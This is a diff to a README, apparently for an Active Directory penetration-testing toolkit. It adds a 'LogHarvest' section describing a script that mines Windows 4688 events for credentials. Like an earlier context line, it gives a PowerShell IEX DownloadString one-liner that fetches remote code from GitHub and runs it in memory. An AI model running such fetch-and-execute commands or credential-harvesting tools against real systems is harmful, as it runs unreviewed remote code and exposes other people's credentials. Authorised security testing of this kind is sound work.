@@ -54,3 +54,14 @@ IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/
 ```
 passpull [DC hostname]
 ```
+
+
+## LogHarvest
+Inspired by: https://practicalsecurityanalytics.com/extracting-credentials-from-windows-logs/
+
+Will Search through Windows 4688 events. This will only work if the client has enabled logging. The script will check for the regestry key. 
+```
+IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Kahvi-0/ADEnum/main/logharvest.ps1')
+```
+More reading:
+- https://community.splunk.com/t5/Getting-Data-In/CMD-Command-Line-Logging/m-p/519506
